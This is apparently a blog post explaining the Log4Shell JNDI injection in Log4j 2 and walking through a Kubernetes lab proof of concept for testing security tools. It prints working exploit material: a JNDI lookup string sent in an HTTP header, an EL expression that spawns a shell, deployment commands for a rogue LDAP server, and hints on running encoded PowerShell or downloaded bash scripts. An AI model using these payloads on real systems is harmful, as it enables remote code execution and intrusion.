## Introduction

_Sorry, I couldn't resist using a photo of a masked man operating in the dark several computers while standing up. It won't happen again._

In this second post about the Log4j&nbsp;2 vulnerabilities, I will describe **technical details** of the _remote code execution_, as well as present a **proof of concept** using **Kubernetes** that is very easy to deploy, safe to run in a test environment, and very useful to test security tools, fixes, and mitigations.

To learn more about what is Log4j and JNDI, don't forget to visit also my other posts about the Log4j 2 vulnerabilities:
* [Part I: History]({% post_url 2021-12-17-log4j-part-i %}){:target="_blank"}
* [Part II: Kubernetes POC]({% post_url 2022-02-01-log4j-part-ii %}) (this post)
* Part III: Security, fixes, and mitigations (work in progress, stay tuned)

## How does the exploit work

It requires the combination of an old vulnerability/misconfiguration not patched in Java for JNDI, and another old but recently discovered one in Log4J 2.

The **Java Naming and Directory Interface (JNDI)** is an API that allows you to interface with several naming and directory services, like _Lightweight Directory Access Protocol_ (LDAP) or _Remote Method Invocation_ (RMI), to look up data and resources.

For example, using the JNDI string `ldap://malicious.com/object` we are looking into the `malicious.com` domain using the LDAP protocol for information on the resource named "object".

The **Log4j 2** library includes the ability to execute _lookups_, as a way to add values at arbitrary places, using a plugging that implements the `StrLookup` interface. For JNDI, those lookups were enabled by default until version 2.17. When you log a string that contains a dollar sign followed by brackets, what is inside of that will get resolved using JNDI. For example:

```java
log.info("${ldap://malicious.com/a}")
```

The problem comes when you log information that comes from a user, they may include that string crafted in a way to trigger the server to execute the lookup call if you don't sanitize it. It can be as simple as including the lookup string in the URL or `user-agent` field of a browser or a _CURL_ call. But not only that, anything that would be logged by a server can be used to inject the lookup string, like [the text you are sending in a chat](https://twitter.com/_JohnHammond/status/1469255402290401285){:target="_blank"}, or even by setting it as [the name of an iPhone device](https://twitter.com/chvancooten/status/1469340927923826691){:target="_blank"}.

_Log4j 2 vulnerability exploitation sequence_

One of the data types that can be returned on LDAP or RMI call is a URI pointing to a Java class. If the class is unknown on the local Java execution context, you can specify in the `javaFactory` field a deserialization factory class that has to exist on the attacked server, implements `javax.naming.spi.ObjectFactory` and have at least a `getObjectInstance` method.

So for a successful attack, you can use the javax.el.ELProcessor class that has an `eval` method that you force to be executed on deserialization, relying for example on the `org.apache.naming.factory.BeanFactory` factory class to create and execute it. See [additional details in this article](https://www.veracode.com/blog/research/exploiting-jndi-injections-java){:target="_blank"}. Different base Java environments (Tomcat, Websphere, etc) may use a different existing factory class to succeed. Then, the code to be executed that give us ultimate _remote code execution_ can be something like this:

```java
// Malicious expression on code deserialization for arbitrary code execution 
{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','touch /root/test.txt']).start()")}
 ```

Oracle included in the past improvements on Java to try to fix the JNDI vulnerability that were not succesfull:

ðŸ“…**2018-10-16**, Java 8u191: Same `classFactoryLocation` restriction added also to LDAP. `javaFactory` is still usable to use for RCE on both RMI and LDAP to this day.

## Kubernetes Proof of Concept

Today several proofs of concept have been created for the Log4j 2 vulnerability, as well as for setting up a malicious LDAP server. I have combined two very interesting ones to create my own version that runs on Kubernetes, that we can use to do additional test on (see part III of this article series).

[https://github.com/vicenteherrera/log4shell-kubernetes](https://github.com/vicenteherrera/log4shell-kubernetes){:target="_blank"}

You can test this yourself using your preferred Kubernetes service on the cloud, online using a free [Okteto](https://github.com/vicenteherrera/log4shell-kubernetes#try-everything-using-okteto){:target="_blank"} account, or locally (using Minikube, Kind, etc). Even if you are not very interested in using Kubernetes to test this, this procedure is very simple to run.

As an example, let's start [Minikube](https://minikube.sigs.k8s.io/docs/start/){:target="_blank"} to use as target cluster:

```bash
minikube start
```

To deploy the vulnerable Log4j&nbsp;2 application, and the malicious LDAP server, you don't even have to clone or download the repository or build container images, just execute the following in your test cluster.

```bash
kubectl apply -f https://raw.githubusercontent.com/vicenteherrera/log4shell-kubernetes/main/vulnerable-log4j.yaml
kubectl apply -f https://raw.githubusercontent.com/vicenteherrera/log4shell-kubernetes/main/rogue-jndi.yaml
```

This will deploy for Kubernetes objects:
 * `vulnerable-log4j` service, that exposes `vulnerable-log4j-app` deployment, that deploys `quay.io/vicenteherrera/log4shell-vulnerable-app` container image.
 * `rogue-jndi` service, that exposes `rogue-jndi-app` deployment, that deploys `quay.io/vicenteherrera/rogue-jndi` container image.

Everything will be deployed to the current namespace, and as we are not attaching any ingress or load balancer. A more realistic scenario would be to deploy only the vulnerable application on the cluster, expose it to the internet, and deploy a different server for the rogue JNDI server and starter attack. But this way the workloads will not be exposed to the global Internet, and the execution of the attack will not be any different.

You can check the logs of each service to monitor what's happening with them:

```bash
# run on different terminals
kubectl logs service/rogue-jndi -f
kubectl logs service/vulnerable-log4j -f
```

Looking at the rogue-jndi service log, we see it tells us that to execute the remote code in Tomcat, we should use the string `${jndi:ldap://rogue-jndi:1389/o=tomcat}`. 

To have Log4j 2 log that string, you can use a disposable pod to run on the same cluster. From it you can send a CURL request to the vulnerable service with a `X-Api-Version` parameter of the header of the call that includes the string. The vulnerable application will try to store it in its log, and the remote code execution will be triggered.

To do this, we again deploy to the same namespace a pod with CURL and shell access. This way we are triggering the attack without having to expose everything to all Internet as explained before, and the only difference would be the URL to use for a realistic attack would be the one for the public IP address of the service.

```bash
kubectl run my-shell --rm -it --image curlimages/curl -- sh
curl vulnerable-log4j:8080 -H 'X-Api-Version: ${jndi:ldap://rogue-jndi:1389/o=tomcat}'
```

The [rogue-jndi service Dockerfile container image definition](https://github.com/vicenteherrera/log4shell-kubernetes/blob/main/Dockerfile-rogue-jndi){:target="_blank"} includes in the CMD procedure the remote code to be executed when it triggers its upload. Itâ€™s a simple command to write to a `/root/test.txt` file.

To validate the attack was successful, let's check what is in the `/root/` directory of the vulnerable application:
```bash
kubectl exec service/vulnerable-log4j -it -- cat /root/test.txt
```

You should see the file exists and include the date and time of each time you have triggered the attack.

## POC considerations

For the vulnerable app, after testing several options Iâ€™ve chosen [github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) because it includes Gradle for dependency management and you can build your own container image with the provided Dockerfile. Other repositories only included the compressed `.war` file, claiming to use a pom.xml for maven that can't be used to rebuild the war because old dependencies not being available (they may have used a local cache of them). Others just include the container files without all the files required for building the application. The chosen POC is better because we can make modifications to the source code, the Java configuration, or the base Java container image to test the efect on the vulnerability.

For the malicious JNDI server, Iâ€™ve chosen [github.com/veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi). It allows you to respond with different attack strings for different Java application servers using the same single port. Another nice alternative is [github.com/welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit).

Rogue-jndi lacked a Dockerfile to deploy using a container, so I provide one that just creates a `/root/test.txt` file on the compromised workload on a successful attack. You can modify it to do different scenarios. But I warn you, you can't use `&&`, `;`, `|` or other ways of chaining different command as it has been built. When interpreting the string, it will be treated as a single command with everything else as parameters for it. Go figure, a vulnerability exploitation example that takes very seriously string sanitization of its parameters. For compromising _Windows_ that is not a problem, a single `powershell.exe  -encodedCommand <base64 string>` will execute anything. For _Linux_, you can hardcode other command executions directly on the `rogue-jndi` source code instead of relying on what is passed as a parameter when it starts. Or just modify the code and send different URLs with CURL for different commands to execute. There are several ways to succeed in executing a `wget` or `curl` to download a bash script, and then execute it in a second command.

## Conclusion

JNDI used for _remote code execution_ is an old story that hasn't been patched in a long time. Log4j&nbsp;2 failing to sanitize strings is vulnerable to this kind of attack. Using the [GitHub repository I've created](https://github.com/vicenteherrera/log4shell-kubernetes){:target="_blank"}, you can in very few steps reproduce the attack to experiment and test security tools.
